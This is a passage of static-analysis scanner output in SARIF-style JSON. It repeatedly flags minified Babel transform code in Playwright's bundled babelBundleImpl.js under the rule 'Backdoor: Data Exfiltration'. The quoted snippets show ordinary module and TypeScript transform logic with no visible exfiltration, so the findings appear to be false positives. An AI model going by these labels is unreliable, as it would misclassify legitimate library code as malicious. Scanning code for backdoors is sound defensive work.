            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1934,
                  "startColumn": 1071,
                  "endLine": 1934,
                  "endColumn": 1076,
                  "snippet": {
                    "text": "is.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Object.keys(F).filter(K=>K!==\"module\"&&K!==\"exports\"?!1:this.scope.getBinding(K)===O.scope.getBinding(K))[0];if(R){let K=O.get(\"right\");K.replaceWith(ln.types.sequenceExpression([K.node,I(R)]))}}}};return{name:\"transform-modules-commonjs\",pre(){this.file.set(\"@babel/plugin-transform-modules-*\",\"commonjs\"),p&&(0,QE.defineCommonJSHook)(this.file,(0,A1e.lazyImportsHook)(p))},visitor:{[\"CallExpression\"+(e.types.importExpression",
                    "rendered": {
                      "text": "is.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Object.keys(F).filter(K=>K!==\"module\"&&K!==\"exports\"?!1:this.scope.getBinding(K)===O.scope.getBinding(K))[0];if(R){let K=O.get(\"right\");K.replaceWith(ln.types.sequenceExpression([K.node,I(R)]))}}}};return{name:\"transform-modules-commonjs\",pre(){this.file.set(\"@babel/plugin-transform-modules-*\",\"commonjs\"),p&&(0,QE.defineCommonJSHook)(this.file,(0,A1e.lazyImportsHook)(p))},visitor:{[\"CallExpression\"+(e.types.importExpression",
                      "markdown": "`is.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Object.keys(F).filter(K=>K!==\"module\"&&K!==\"exports\"?!1:this.scope.getBinding(K)===O.scope.getBinding(K))[0];if(R){let K=O.get(\"right\");K.replaceWith(ln.types.sequenceExpression([K.node,I(R)]))}}}};return{name:\"transform-modules-commonjs\",pre(){this.file.set(\"@babel/plugin-transform-modules-*\",\"commonjs\"),p&&(0,QE.defineCommonJSHook)(this.file,(0,A1e.lazyImportsHook)(p))},visitor:{[\"CallExpression\"+(e.types.importExpression`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1934,
                  "startColumn": 813,
                  "endLine": 1934,
                  "endColumn": 818,
                  "snippet": {
                    "text": "pe.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier()){let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);if(this.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Object.keys(F).filter(K=>K!==\"module\"&&K!==\"exports\"?!1:this.scope.getBinding(K)===O.scope.getBinding(K))[0];if(R){let K=O.get(\"right\");K.replaceWith(ln.types.sequenceEx",
                    "rendered": {
                      "text": "pe.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier()){let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);if(this.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Object.keys(F).filter(K=>K!==\"module\"&&K!==\"exports\"?!1:this.scope.getBinding(K)===O.scope.getBinding(K))[0];if(R){let K=O.get(\"right\");K.replaceWith(ln.types.sequenceEx",
                      "markdown": "`pe.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier()){let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);if(this.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Object.keys(F).filter(K=>K!==\"module\"&&K!==\"exports\"?!1:this.scope.getBinding(K)===O.scope.getBinding(K))[0];if(R){let K=O.get(\"right\");K.replaceWith(ln.types.sequenceEx`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1934,
                  "startColumn": 648,
                  "endLine": 1934,
                  "endColumn": 653,
                  "snippet": {
                    "text": ",UpdateExpression(O){let _=O.get(\"argument\");if(!_.isIdentifier())return;let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);this.scope.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier()){let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);if(this.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Obje",
                    "rendered": {
                      "text": ",UpdateExpression(O){let _=O.get(\"argument\");if(!_.isIdentifier())return;let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);this.scope.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier()){let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);if(this.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Obje",
                      "markdown": "`,UpdateExpression(O){let _=O.get(\"argument\");if(!_.isIdentifier())return;let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);this.scope.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier()){let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);if(this.scope.getBinding(F)!==R)return;let te=O.get(\"right\");te.replaceWith(ln.types.sequenceExpression([te.node,I(F)]))}else if(_.isPattern()){let F=_.getOuterBindingIdentifiers(),R=Obje`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1934,
                  "startColumn": 376,
                  "endLine": 1934,
                  "endColumn": 381,
                  "snippet": {
                    "text": "ts\")return;let F=O.scope.getBinding(_);this.scope.getBinding(_)!==F||O.parentPath.isObjectProperty({value:O.node})&&O.parentPath.parentPath.isObjectPattern()||O.parentPath.isAssignmentExpression({left:O.node})||O.isAssignmentExpression({left:O.node})||O.replaceWith(I(_))},UpdateExpression(O){let _=O.get(\"argument\");if(!_.isIdentifier())return;let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);this.scope.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier())",
                    "rendered": {
                      "text": "ts\")return;let F=O.scope.getBinding(_);this.scope.getBinding(_)!==F||O.parentPath.isObjectProperty({value:O.node})&&O.parentPath.parentPath.isObjectPattern()||O.parentPath.isAssignmentExpression({left:O.node})||O.isAssignmentExpression({left:O.node})||O.replaceWith(I(_))},UpdateExpression(O){let _=O.get(\"argument\");if(!_.isIdentifier())return;let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);this.scope.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier())",
                      "markdown": "`ts\")return;let F=O.scope.getBinding(_);this.scope.getBinding(_)!==F||O.parentPath.isObjectProperty({value:O.node})&&O.parentPath.parentPath.isObjectPattern()||O.parentPath.isAssignmentExpression({left:O.node})||O.isAssignmentExpression({left:O.node})||O.replaceWith(I(_))},UpdateExpression(O){let _=O.get(\"argument\");if(!_.isIdentifier())return;let F=_.node.name;if(F!==\"module\"&&F!==\"exports\")return;let R=O.scope.getBinding(F);this.scope.getBinding(F)===R&&O.replaceWith(ln.types.assignmentExpression(O.node.operator[0]+\"=\",_.node,I(F)))},AssignmentExpression(O){let _=O.get(\"left\");if(_.isIdentifier())`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1927,
                  "startColumn": 467,
                  "endLine": 1927,
                  "endColumn": 472,
                  "snippet": {
                    "text": "(up,\"__esModule\",{value:!0});up.defineCommonJSHook=v1e;up.makeInvokers=T1e;var zE=\"@babel/plugin-transform-modules-commonjs/customWrapperPlugin\";function v1e(e,t){let r=e.get(zE);r||e.set(zE,r=[]),r.push(t)}function JE(e,t){if(e)for(let r of e){let n=t(r);if(n!=null)return n}}function T1e(e){let t=e.get(zE);return{getWrapperPayload(...r){return JE(t,n=>n.getWrapperPayload==null?void 0:n.getWrapperPayload(...r))},wrapReference(...r){return JE(t,n=>n.wrapReference==null?void 0:n.wrapReference(...r))},buildRequireWrapper(...r){return JE(t,n=>n.buildRequireWrapper==null?void 0:n.buildRequireWrapper(...",
                    "rendered": {
                      "text": "(up,\"__esModule\",{value:!0});up.defineCommonJSHook=v1e;up.makeInvokers=T1e;var zE=\"@babel/plugin-transform-modules-commonjs/customWrapperPlugin\";function v1e(e,t){let r=e.get(zE);r||e.set(zE,r=[]),r.push(t)}function JE(e,t){if(e)for(let r of e){let n=t(r);if(n!=null)return n}}function T1e(e){let t=e.get(zE);return{getWrapperPayload(...r){return JE(t,n=>n.getWrapperPayload==null?void 0:n.getWrapperPayload(...r))},wrapReference(...r){return JE(t,n=>n.wrapReference==null?void 0:n.wrapReference(...r))},buildRequireWrapper(...r){return JE(t,n=>n.buildRequireWrapper==null?void 0:n.buildRequireWrapper(...",
                      "markdown": "`(up,\"__esModule\",{value:!0});up.defineCommonJSHook=v1e;up.makeInvokers=T1e;var zE=\"@babel/plugin-transform-modules-commonjs/customWrapperPlugin\";function v1e(e,t){let r=e.get(zE);r||e.set(zE,r=[]),r.push(t)}function JE(e,t){if(e)for(let r of e){let n=t(r);if(n!=null)return n}}function T1e(e){let t=e.get(zE);return{getWrapperPayload(...r){return JE(t,n=>n.getWrapperPayload==null?void 0:n.getWrapperPayload(...r))},wrapReference(...r){return JE(t,n=>n.wrapReference==null?void 0:n.wrapReference(...r))},buildRequireWrapper(...r){return JE(t,n=>n.buildRequireWrapper==null?void 0:n.buildRequireWrapper(...`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1927,
                  "startColumn": 337,
                  "endLine": 1927,
                  "endColumn": 342,
                  "snippet": {
                    "text": "=\"lazy/function\")return S_.types.callExpression(t,[])}});lp.lazyImportsHook=E1e});var P_=E(up=>{\"use strict\";Object.defineProperty(up,\"__esModule\",{value:!0});up.defineCommonJSHook=v1e;up.makeInvokers=T1e;var zE=\"@babel/plugin-transform-modules-commonjs/customWrapperPlugin\";function v1e(e,t){let r=e.get(zE);r||e.set(zE,r=[]),r.push(t)}function JE(e,t){if(e)for(let r of e){let n=t(r);if(n!=null)return n}}function T1e(e){let t=e.get(zE);return{getWrapperPayload(...r){return JE(t,n=>n.getWrapperPayload==null?void 0:n.getWrapperPayload(...r))},wrapReference(...r){return JE(t,n=>n.wrapReference==null?vo",
                    "rendered": {
                      "text": "=\"lazy/function\")return S_.types.callExpression(t,[])}});lp.lazyImportsHook=E1e});var P_=E(up=>{\"use strict\";Object.defineProperty(up,\"__esModule\",{value:!0});up.defineCommonJSHook=v1e;up.makeInvokers=T1e;var zE=\"@babel/plugin-transform-modules-commonjs/customWrapperPlugin\";function v1e(e,t){let r=e.get(zE);r||e.set(zE,r=[]),r.push(t)}function JE(e,t){if(e)for(let r of e){let n=t(r);if(n!=null)return n}}function T1e(e){let t=e.get(zE);return{getWrapperPayload(...r){return JE(t,n=>n.getWrapperPayload==null?void 0:n.getWrapperPayload(...r))},wrapReference(...r){return JE(t,n=>n.wrapReference==null?vo",
                      "markdown": "`=\"lazy/function\")return S_.types.callExpression(t,[])}});lp.lazyImportsHook=E1e});var P_=E(up=>{\"use strict\";Object.defineProperty(up,\"__esModule\",{value:!0});up.defineCommonJSHook=v1e;up.makeInvokers=T1e;var zE=\"@babel/plugin-transform-modules-commonjs/customWrapperPlugin\";function v1e(e,t){let r=e.get(zE);r||e.set(zE,r=[]),r.push(t)}function JE(e,t){if(e)for(let r of e){let n=t(r);if(n!=null)return n}}function T1e(e){let t=e.get(zE);return{getWrapperPayload(...r){return JE(t,n=>n.getWrapperPayload==null?void 0:n.getWrapperPayload(...r))},wrapReference(...r){return JE(t,n=>n.wrapReference==null?vo`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 3547,
                  "endLine": 1921,
                  "endColumn": 3552,
                  "snippet": {
                    "text": "}){d.definite&&(d.definite=null)},TSIndexSignature(d){d.remove()},ClassDeclaration(d){let{node:y}=d;y.declare&&ip(d)},Class(d){let{node:y}=d;y.typeParameters&&(y.typeParameters=null),y.superTypeParameters&&(y.superTypeParameters=null),y.implements&&(y.implements=null),y.abstract&&(y.abstract=null),d.get(\"body.body\").forEach(v=>{v.isClassMethod()||v.isClassPrivateMethod()?v.node.kind===\"constructor\"?f.constructor(v,d):f.method(v):(v.isClassProperty()||v.isClassPrivateProperty()||v.isClassAccessorProperty())&&f.field(v)})},Function(d){let{node:y}=d;y.typeParameters&&(y.typeParameters=null),y.returnTy",
                    "rendered": {
                      "text": "}){d.definite&&(d.definite=null)},TSIndexSignature(d){d.remove()},ClassDeclaration(d){let{node:y}=d;y.declare&&ip(d)},Class(d){let{node:y}=d;y.typeParameters&&(y.typeParameters=null),y.superTypeParameters&&(y.superTypeParameters=null),y.implements&&(y.implements=null),y.abstract&&(y.abstract=null),d.get(\"body.body\").forEach(v=>{v.isClassMethod()||v.isClassPrivateMethod()?v.node.kind===\"constructor\"?f.constructor(v,d):f.method(v):(v.isClassProperty()||v.isClassPrivateProperty()||v.isClassAccessorProperty())&&f.field(v)})},Function(d){let{node:y}=d;y.typeParameters&&(y.typeParameters=null),y.returnTy",
                      "markdown": "`}){d.definite&&(d.definite=null)},TSIndexSignature(d){d.remove()},ClassDeclaration(d){let{node:y}=d;y.declare&&ip(d)},Class(d){let{node:y}=d;y.typeParameters&&(y.typeParameters=null),y.superTypeParameters&&(y.superTypeParameters=null),y.implements&&(y.implements=null),y.abstract&&(y.abstract=null),d.get(\"body.body\").forEach(v=>{v.isClassMethod()||v.isClassPrivateMethod()?v.node.kind===\"constructor\"?f.constructor(v,d):f.method(v):(v.isClassProperty()||v.isClassPrivateProperty()||v.isClassAccessorProperty())&&f.field(v)})},Function(d){let{node:y}=d;y.typeParameters&&(y.typeParameters=null),y.returnTy`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 1864,
                  "endLine": 1921,
                  "endColumn": 1869,
                  "snippet": {
                    "text": "areFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushContainer(\"body\",r.exportNamedDeclaration())}},ExportNamedDeclaration(d,y){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),d.node.exportKind===\"type\"){d.remove();return}if(d.node.source&&d.node.specifiers.length>0&&d.node.specifiers.every(v=>v.type===\"ExportSpecifier\"&&v.",
                    "rendered": {
                      "text": "areFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushContainer(\"body\",r.exportNamedDeclaration())}},ExportNamedDeclaration(d,y){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),d.node.exportKind===\"type\"){d.remove();return}if(d.node.source&&d.node.specifiers.length>0&&d.node.specifiers.every(v=>v.type===\"ExportSpecifier\"&&v.",
                      "markdown": "`areFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushContainer(\"body\",r.exportNamedDeclaration())}},ExportNamedDeclaration(d,y){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),d.node.exportKind===\"type\"){d.remove();return}if(d.node.source&&d.node.specifiers.length>0&&d.node.specifiers.every(v=>v.type===\"ExportSpecifier\"&&v.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 1750,
                  "endLine": 1921,
                  "endColumn": 1755,
                  "snippet": {
                    "text": "bject.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushContainer(\"body\",r.exportNamedDeclaration())}},ExportNamedDeclaration(d,y){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),d.node.exportKind===\"type\"){d.remov",
                    "rendered": {
                      "text": "bject.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushContainer(\"body\",r.exportNamedDeclaration())}},ExportNamedDeclaration(d,y){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),d.node.exportKind===\"type\"){d.remov",
                      "markdown": "`bject.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushContainer(\"body\",r.exportNamedDeclaration())}},ExportNamedDeclaration(d,y){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),d.node.exportKind===\"type\"){d.remov`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 1580,
                  "endLine": 1921,
                  "endColumn": 1585,
                  "snippet": {
                    "text": "if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushC",
                    "rendered": {
                      "text": "if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushC",
                      "markdown": "`if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnumDeclaration({declare:!0})||R.isTSModuleDeclaration({declare:!0})&&R.get(\"id\").isIdentifier())&&(0,zn.registerGlobalType)(O,R.node.id.name)}},exit(d){d.node.sourceType===\"module\"&&Gr.get(d.node)&&d.pushC`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 1377,
                  "endLine": 1921,
                  "endColumn": 1382,
                  "snippet": {
                    "text": "for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnu",
                    "rendered": {
                      "text": "for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnu",
                      "markdown": "`for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterfaceDeclaration()||R.isClassDeclaration({declare:!0})||R.isTSEnu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 505,
                  "endLine": 1921,
                  "endColumn": 510,
                  "snippet": {
